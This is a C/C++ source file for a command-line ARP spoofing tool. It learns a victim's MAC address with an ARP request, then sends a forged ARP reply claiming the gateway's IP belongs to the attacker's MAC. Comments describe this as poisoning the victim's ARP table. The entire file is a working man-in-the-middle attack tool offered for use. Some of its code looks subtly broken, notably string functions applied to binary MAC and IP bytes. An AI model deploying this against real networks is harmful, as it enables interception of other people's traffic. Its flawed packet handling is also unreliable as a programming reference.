#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h> 
#include <sys/ioctl.h> 
#include <net/if.h>  
#include <unistd.h> 
#include "protocol_structure.h"
#include "printarr.h"
#include "protocol_check.h"
#include "swap_endian.h"
#define ETHER_LEN 14
#define ETHERTYPE_ARP 0X0806
#define ARP_HTYPE 0X0001
#define ARP_PTYPE 0X0800
#define ARP_HLEN 0X06
#define ARP_PLEN 0X04
#define ARP_OPER_REQ 0X0001
#define ARP_OPER_REP 0X0002

void usage() {
  printf("syntax: arp_spoof <interface> <sender ip> <target ip>\n");
  printf("sample: pcap_test wlan0 192.168.10.34 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
  if (argc != 4) {
    usage();
    return -1;
  }

  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }

  //Default variables
  struct pcap_pkthdr* header;
  const u_char* packet;
  int res;

  // My variables , structures 
  struct sniff_ethernet *ethernet_request;
  struct sniff_arp *arp_request;
  struct sniff_ethernet *ethernet_reply;
  struct sniff_arp *arp_reply;
  struct sniff_ethernet *ethernet;
  struct sniff_arp *arp;

  char arp_request_packet[42];    
  char arp_reply_packet[42];

  char* ip_sender_str = argv[2];      // readable ip 
  char* ip_target_str = argv[3];      // readable ip
  char ip_sender[4];                     // Victim ip
  char ip_target[4];                    // Gateway ip usaully
  char ip_attacker[4]; 		           	// My IP Address

  char mac_broadcast[6] = {0xFF , 0xFF , 0xFF , 0xFF , 0xFF , 0xFF};
  char mac_sender[6] = {0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00};
  char mac_attacker[6];               // My Mac Address

  inet_pton(AF_INET , ip_sender_str , ip_sender);
  inet_pton(AF_INET , ip_target_str , ip_target);


  /*        Get my IP Address      */
  int fd;
  struct ifreq ifr;

  fd = socket(AF_INET, SOCK_DGRAM, 0);

  ifr.ifr_addr.sa_family = AF_INET;		 //I want to get an IPv4 IP address

  strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);	 //I want IP address attached to "eth0"

  ioctl(fd, SIOCGIFADDR, &ifr);

  close(fd);
  memcpy(ip_attacker,&((((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr).s_addr),4);
  /*************************************************************************************************/


  /*        Get my Mac Address      */
  struct ifconf ifc; 
  char buf[1024]; 
  bool success = false; 

  int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP); 
  if (sock == -1) { /* handle error*/ }; 

  ifc.ifc_len = sizeof(buf); 
  ifc.ifc_buf = buf; 
  if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ } 

  ifreq* it = ifc.ifc_req; 
  const ifreq* const end = it + (ifc.ifc_len / sizeof(ifreq)); 

  for (; it != end; ++it) { 
      strcpy(ifr.ifr_name, it->ifr_name); 
      if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) { 
              if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback 
                      if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) { 
                              success = true; 
                              break; 
                      } 
              } 
      } 
      else { /* handle error */ } 
  } 
  if (success) memcpy(mac_attacker, ifr.ifr_hwaddr.sa_data, 6);
  /*************************************************************************************************/
    
  /*        Set Arp request packet      */
  ethernet_request = (struct sniff_ethernet*)arp_request_packet;
  arp_request = (struct sniff_arp*)(arp_request_packet+14);

  strcpy((char*)(ethernet_request->ether_dhost) , mac_broadcast);
  memcpy((ethernet_request->ether_shost) , mac_attacker ,6);  		// strcpy doesn't work so i use memcpy
  ethernet_request->ether_type = swap_word_endian(ETHERTYPE_ARP);

  arp_request->htype = swap_word_endian(ARP_HTYPE);
  arp_request->ptype = swap_word_endian(ARP_PTYPE);
  arp_request->hlen = ARP_HLEN;
  arp_request->plen = ARP_PLEN;
  arp_request->oper = swap_word_endian(ARP_OPER_REQ);
  memcpy(arp_request->sha , mac_attacker ,6); 			               	// strcpy doesn't work so i use memcpy
  strcpy(arp_request->spa , ip_attacker);
  strcpy(arp_request->tha , mac_sender);
  strcpy(arp_request->tpa , ip_sender);
/*************************************************************************************************/

  /*        Set Arp reply packet      */
  ethernet_reply = (struct sniff_ethernet*)arp_reply_packet;
  arp_reply = (struct sniff_arp*)(arp_reply_packet+14);

  strcpy((char*)(ethernet_reply->ether_dhost) , mac_sender);    // We have to get sender(victim) mac address by arp request
  memcpy((ethernet_reply->ether_shost) , mac_attacker ,6);      // strcpy doesn't work so i use memcpy
  ethernet_reply->ether_type = swap_word_endian(ETHERTYPE_ARP);

  arp_reply->htype = swap_word_endian(ARP_HTYPE);
  arp_reply->ptype = swap_word_endian(ARP_PTYPE);
  arp_reply->hlen = ARP_HLEN;
  arp_reply->plen = ARP_PLEN;
  arp_reply->oper = swap_word_endian(ARP_OPER_REP);
  memcpy(arp_reply->sha , mac_attacker ,6);                      // strcpy doesn't work so i use memcpy
  strcpy(arp_reply->spa , ip_target);                             // Poisoning victim's arp table (in victim arp table , target's mac address is changed to attacer's mac address) 
  strcpy(arp_reply->tha , mac_sender);                            // We have to get sender(victim) mac address by arp request
  strcpy(arp_reply->tpa , ip_sender);                             // Sender ip (Victim)
/*************************************************************************************************/

  printf("send arp request\n");
  pcap_sendpacket(handle ,(unsigned char*)arp_request_packet , 42);

  while (true) {
    res = pcap_next_ex(handle, &header, &packet);

    ethernet = (struct sniff_ethernet*)packet;
    arp = (struct sniff_arp*)(packet + 14);


    if(arp_check(swap_word_endian(ethernet->ether_type))    // Is it ARP protocol?
      && swap_word_endian(arp->oper) == ARP_OPER_REP	         // Is it arp reply ?
      &&!strcmp(arp->spa , ip_sender)	 )                        // Is it sender ip (victim)?
    {
      memcpy(mac_sender , arp->sha , 6);		                              // Get sender(victim) mac address
      memcpy((char*)(ethernet_reply->ether_dhost) , mac_sender , 6);  // Set sender(victim) mac address in arp reply
      memcpy(arp_reply->tha , mac_sender , 6);                            // Set sender(victim) mac address in arp reply

      printf("send arp reply packet\n");
      pcap_sendpacket(handle ,(unsigned char*)arp_reply_packet , 42);
    }



    if (res == 0) continue;
    if (res == -1 || res == -2) break;
   
    
  }

  pcap_close(handle);
  return 0;
}
